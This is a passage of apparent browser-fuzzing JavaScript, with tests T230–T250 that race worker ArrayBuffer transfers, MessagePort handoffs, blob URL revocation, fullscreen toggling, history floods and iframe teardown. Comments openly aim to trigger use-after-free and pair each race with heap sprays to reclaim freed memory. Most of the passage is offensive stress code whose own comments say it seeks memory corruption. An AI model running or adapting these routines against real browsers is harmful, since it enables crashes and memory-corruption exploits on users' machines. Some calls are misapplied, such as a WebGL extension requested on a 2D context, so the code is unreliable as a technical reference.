    log("Iniciando T230: THE EVENT HORIZON (ALL VECTORS)...");
    
    // 1. Worker Memory Pressure
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){var a=[]; while(1) a.push(new ArrayBuffer(1024*1024));}"], {type:'js'})));
    w.postMessage("die");
    
    // 2. Fullscreen Toggle Storm
    var el = document.createElement('div');
    el.style.background = "magenta";
    document.body.appendChild(el);
    var fsT = setInterval(() => { if(Math.random()>0.5) reqFS(el); else exitFS(); }, 100);
    
    // 3. History Bomb
    var histT = setInterval(() => { try{history.pushState({},"x","/"+Date.now());}catch(e){} }, 50);
    
    // 4. DOM Layout Thrashing
    var domT = setInterval(() => { 
        var d = document.createElement('div'); 
        d.innerHTML = "A".repeat(5000);
        document.body.appendChild(d);
        var x = d.offsetWidth;
        document.body.removeChild(d);
    }, 20);

    setTimeout(function() {
        clearInterval(fsT);
        clearInterval(histT);
        clearInterval(domT);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T230: Horizon event ended.");
    }, 5000);
}
function runTest231() {
    log("Iniciando T231: Worker Port Entanglement Loop...");
    var ch1 = new MessageChannel();
    var ch2 = new MessageChannel();
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ping');}"],{type:'js'})));
    
    // Entrelaça os canais enviando portas cruzadas
    // Isso cria uma dependência circular de handles no kernel
    var t = setInterval(function() {
        try {
            w.postMessage(ch1.port2, [ch1.port2]);
            ch1.port1.postMessage(ch2.port2, [ch2.port2]);
            
            // Fecha e recria rapidamente
            ch2.port1.close();
            ch1 = new MessageChannel();
            ch2 = new MessageChannel();
            
            // Aloca lixo do tamanho de descritores de porta
            var spray = new Uint8Array(100).fill(0xCC);
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T231: IPC entanglement stop.");
    }, 3000);
}

function runTest232() {
    log("Iniciando T232: TypedArray Transfer Reclaim Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(ab);
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; self.close();}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        
        try {
            // Transfere buffer
            w.postMessage(ab, [ab]);
            
            // Tenta acessar buffer neuterizado
            // Se o worker fechar antes do neutering completar na main thread, o buffer pode sobreviver
            view[0] = 1; 
        } catch(e) {}
        
        // Realoca
        ab = new ArrayBuffer(1024 * 1024);
        view = new Uint8Array(ab);
        
        // Heap Spray para preencher lacunas de memória
        var filler = new ArrayBuffer(0x1000); 
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T232: Transfer race finished.");
    }, 3000);
}

function runTest233() {
    log("Iniciando T233: Worker Import Chain Termination...");
    // Worker A importa B, que importa C.
    // Matamos A, esperando que o cleanup de B e C cause UAF.
    var script = URL.createObjectURL(new Blob(["setInterval(function(){new Uint8Array(1000);},1);"], {type:'js'}));
    var code = `importScripts('${script}'); self.onmessage=function(){while(1);}`;
    
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
        w.postMessage("start");
        workers.push(w);
        
        if(workers.length > 5) {
            var dead = workers.shift();
            dead.terminate();
            // Tenta reusar a memória da thread stack
            var spray = new Float64Array(10000).fill(1.1);
        }
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T233: Import chain stress done.");
    }, 3000);
}

function runTest234() {
    log("Iniciando T234: Message Channel Garbage Storm...");
    var code = `
        self.onmessage = function(e) {
            // Gera muito lixo e envia de volta
            var a = [];
            for(var i=0; i<5000; i++) a.push({id: i, buf: new ArrayBuffer(64)});
            postMessage(a);
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia objeto complexo
        w.postMessage({cmd: "flood", data: new Array(1000).fill("A")});
        
        // Força GC na main thread criando objetos temporários
        var temp = document.createElement('div');
        for(var i=0; i<100; i++) temp.appendChild(document.createElement('span'));
        temp = null;
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T234: GC Storm message loop.");
    }, 3000);
}

function runTest235() {
    log("Iniciando T235: Shared Blob URL Fetch Race...");
    var d = new Uint8Array(1024*1024).fill(0xAA);
    var b = new Blob([d]);
    var url = URL.createObjectURL(b);
    
    var code = "self.onmessage=function(u){fetch(u).then(r=>r.arrayBuffer()).then(b=>{postMessage('ok')});}";
    var workers = [];
    for(var i=0; i<8; i++) workers.push(new Worker(URL.createObjectURL(new Blob([code],{type:'js'}))));
    
    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(url));
        
        // Revoga URL enquanto workers estão lendo
        URL.revokeObjectURL(url);
        // Recria imediatamente
        url = URL.createObjectURL(new Blob([d]));
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T235: Blob fetch race done.");
    }, 3000);
}

function runTest236() {
    log("Iniciando T236: Fullscreen History Push Flood...");
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    reqFS(el);
    
    var count = 0;
    var t = setInterval(function() {
        // Push state massivo enquanto em FS
        try {
            var s = {i: count, pad: "P".repeat(1024)};
            history.pushState(s, "S"+count, "/"+count);
            count++;
            
            // A cada 10 estados, sai e entra em FS
            if(count % 10 === 0) {
                exitFS();
                setTimeout(() => reqFS(el), 10);
            }
        } catch(e) {}
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        history.pushState(null, null, "/");
        log(">> T236: History flood/FS toggle stop.");
    }, 3000);
}

function runTest237() {
    log("Iniciando T237: Media Element Orphan Fullscreen...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        // Torna o elemento órfão
        document.body.removeChild(v);
        
        // Modifica atributos que afetam o compositor
        v.controls = true;
        v.style.transform = "rotate(45deg)";
        
        // Dispara evento de UI
        v.dispatchEvent(new Event('resize'));
        
        // Sai do FS globalmente
        exitFS();
        
        // Spray para ocupar memória da superfície de vídeo
        var s = new Uint32Array(0x4000).fill(0xDEADC0DE);
        log(">> T237: Orphan media logic executed.");
    }, 500);
}

function runTest238() {
    log("Iniciando T238: Canvas Render Target Switch...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Desenha frame
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1920,1080);
        
        // Redimensiona (destrói buffer)
        c.width = 100;
        
        // Desenha em buffer pequeno
        ctx.fillRect(0,0,100,100);
        
        // Redimensiona (recria buffer grande)
        c.width = 1920;
        
    }, 30); // 30ms = ~30fps churn rate
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T238: Render target churn done.");
    }, 3000);
}

function runTest239() {
    log("Iniciando T239: Nested Iframe History Lock...");
    var f1 = document.createElement('iframe');
    document.body.appendChild(f1);
    
    f1.onload = function() {
        var f2 = f1.contentDocument.createElement('iframe');
        f1.contentDocument.body.appendChild(f2);
        
        f2.onload = function() {
            var w2 = f2.contentWindow;
            // Cria histórico no frame mais interno
            for(var i=0; i<20; i++) w2.history.pushState(i, ""+i, "/"+i);
            
            // Navega frame pai (destrói f2)
            f1.src = "about:blank";
            
            // Tenta manipular histórico global
            history.back();
            history.forward();
        };
        f2.src = "about:blank";
    };
    f1.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f1)) document.body.removeChild(f1);
        log(">> T239: Nested history lock.");
    }, 3000);
}

function runTest240() {
    log("Iniciando T240: THE OMEGA DESYNC...");
    
    // 1. Worker transfer loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen chaos
    var el = document.createElement('div');
    document.body.appendChild(el);
    
    var running = true;
    
    function loop() {
        if(!running) return;
        
        // IPC
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Visual
        if(Math.random() > 0.5) reqFS(el); else exitFS();
        
        // History
        try { history.replaceState({}, "x", "/"+Date.now()); } catch(e){}
        
        setTimeout(loop, 20);
    }
    loop();
    
    setTimeout(function() {
        running = false;
        w.terminate();
        exitFS();
        document.body.removeChild(el);
        log(">> T240: Desync sequence complete.");
    }, 4000);
}
function runTest241() {
    log("Iniciando T241: Worker Terminate During Transfer...");
    var ab = new ArrayBuffer(1024 * 1024 * 8); // 8MB
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    
    // Worker que tenta ler o buffer imediatamente
    var b = new Blob(["self.onmessage=function(e){var d=new Uint8Array(e.data); postMessage(d[0]);}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        try {
            // A transferência marca o buffer como neutered (inutilizável) na main thread
            // Se matarmos o worker NO EXATO MOMENTO da transferência, o kernel pode se perder sobre quem é o dono da memória
            w.postMessage(ab, [ab]);
            w.terminate();
            
            // Verifica se o buffer ainda é acessível (Race Condition)
            if(ab.byteLength > 0) log("!! T241: Buffer survived transfer!");
            
            // Heap Spray para tentar ocupar o endereço liberado
            var spray = new ArrayBuffer(1024 * 1024 * 8);
        } catch(e) {}
        
        // Realoca para o próximo ciclo
        ab = new ArrayBuffer(1024 * 1024 * 8);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T241: Transfer race finished.");
    }, 3000);
}

function runTest242() {
    log("Iniciando T242: Shared Array Buffer Atomic Tear...");
    // Simulação de race condition em TypedArrays compartilhados via IPC
    var sab = new ArrayBuffer(1024);
    var i32 = new Int32Array(sab);
    
    var code = "self.onmessage=function(e){var v=new Int32Array(e.data); v[0]=0x12345678;}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia buffer (cópia ou transfer)
        w.postMessage(sab);
        
        // Modifica localmente simultaneamente
        i32[0] = 0xFFFFFFFF;
        
        // Tenta confundir o tipo de array view
        try {
            var f32 = new Float32Array(sab);
            f32[0] = 1.5;
        } catch(e){}
        
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T242: Buffer tearing stop.");
    }, 3000);
}

function runTest243() {
    log("Iniciando T243: Message Port Transfer Flood UAF...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    var code = "self.onmessage=function(e){if(e.data.close) e.data.close();}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        try {
            // Cria canais descartáveis
            var temp = new MessageChannel();
            // Transfere porta 1 para o worker
            w.postMessage(temp.port1, [temp.port1]);
            // Fecha porta 2 localmente
            temp.port2.close();
            
            // Força GC na main thread
            var junk = new Array(1000).fill({});
        } catch(e) {}
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T243: Port flooding done.");
    }, 3000);
}

function runTest244() {
    log("Iniciando T244: Blob URL Revocation Thread Race...");
    var data = new Uint8Array(1024*1024).fill(0xCC);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); try{x.send();}catch(e){}}";
    var wb = new Blob([code], {type:'js'});
    
    var workers = [];
    for(var i=0; i<12; i++) workers.push(new Worker(URL.createObjectURL(wb)));
    
    var t = setInterval(function() {
        // Manda todos os workers lerem
        workers.forEach(w => w.postMessage(url));
        
        // Revoga URL imediatamente
        URL.revokeObjectURL(url);
        
        // Recria para manter o loop
        url = URL.createObjectURL(new Blob([data]));
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T244: URL race stopped.");
    }, 3000);
}

function runTest245() {
    log("Iniciando T245: Nested Worker Close Chain Reaction...");
    var innerCode = "self.onmessage=function(e){setInterval(()=>{postMessage(new Uint8Array(1024*1024));},10);}";
    var innerBlob = new Blob([innerCode], {type:'js'});
    var innerURL = URL.createObjectURL(innerBlob);
    
    var outerCode = `
        var w = new Worker('${innerURL}');
        w.onmessage = function(e) { postMessage(e.data); } // Relay
        self.onmessage = function(e) { if(e.data=='kill') w.terminate(); }
    `;
    var outerBlob = new Blob([outerCode], {type:'js'});
    
    var w = new Worker(URL.createObjectURL(outerBlob));
    
    w.onmessage = function(e) {
        // Recebeu dados do inner worker via relay
        // Mata o outer worker, deixando o inner worker órfão enviando mensagens
        w.terminate();
        
        // Spray imediato para pegar heap liberado pelo outer worker
        var spray = new Uint32Array(1024*1024).fill(0xDEADBEEF);
        
        // Reinicia
        w = new Worker(URL.createObjectURL(outerBlob));
    };
    
    setTimeout(function() {
        w.terminate();
        log(">> T245: Worker chain reaction test.");
    }, 3000);
}

function runTest246() {
    log("Iniciando T246: Fullscreen Video Src Swap Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t = setInterval(function() {
        // Troca o src para um Blob que é revogado imediatamente
        var b = new Blob(["junk"], {type:'video/mp4'});
        var u = URL.createObjectURL(b);
        v.src = u;
        URL.revokeObjectURL(u);
        
        // Força reload enquanto em FS
        v.load();
        
        // Toggle display para forçar compositor a descartar/recriar surface
        v.style.display = "none";
        v.offsetHeight; // force layout
        v.style.display = "block";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T246: Video surface panic stop.");
    }, 3000);
}

function runTest247() {
    log("Iniciando T247: History State Getter GC Trigger...");
    var pressure = [];
    
    var poison = {
        get val() {
            // Getter executado durante serialização do History
            // Aloca memória massiva para forçar GC
            pressure = new Array(10000).fill("STRING_PRESSURE");
            // Tenta corromper o histórico durante o push
            history.replaceState(null, null, "/corrupt");
            return 1;
        }
    };
    
    var t = setInterval(function() {
        try {
            history.pushState(poison, "Poison", "/poison");
            history.back();
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T247: History serializer poison done.");
    }, 3000);
}

function runTest248() {
    log("Iniciando T248: Iframe Nav Fullscreen Lockout...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var el = d.createElement('div');
        el.style.background = "red";
        d.body.appendChild(el);
        
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Remove iframe do DOM enquanto ele detém o FS
            document.body.removeChild(f);
            
            // Tenta pedir FS no documento pai imediatamente
            reqFS(document.body);
            
            // Spray de memória para corromper a estrutura de janela antiga
            var spray = new Uint32Array(0x4000).fill(0x13371337);
        }, 100);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T248: Iframe FS lockout attempt.");
    }, 3000);
}

function runTest249() {
    log("Iniciando T249: Canvas Context Loss Resize Loop...");
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Redimensionamento drástico em FS
        c.width = Math.random() > 0.5 ? 4096 : 10;
        c.height = Math.random() > 0.5 ? 2160 : 10;
        
        // Desenha algo
        ctx.fillStyle = "blue";
        ctx.fillRect(0,0,c.width, c.height);
        
        // Tenta perder contexto
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
        // Heap pressure
        var junk = ctx.getImageData(0,0,1,1);
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T249: Canvas FS resize stress.");
    }, 3000);
}

function runTest250() {
    log("Iniciando T250: THE SINGULARITY (ALL-IN-ONE)...");
    
    // 1. Worker transfer loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen toggle
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    var fsInt = setInterval(() => {
        if(Math.random()>0.5) reqFS(el); else exitFS();
    }, 150);
    
    // 3. History Push
    var hInt = setInterval(() => {
        try { history.pushState({data: new Array(100).fill(1)}, "x", "/"+Date.now()); } catch(e){}
    }, 80);
    
    // 4. Memory Alloc
    var memInt = setInterval(() => {
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
    }, 20);

    setTimeout(function() {
        clearInterval(fsInt);
        clearInterval(hInt);
        clearInterval(memInt);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T250: Singularity event collapse.");
    }, 5000);
}
</script>

</body>
</html>
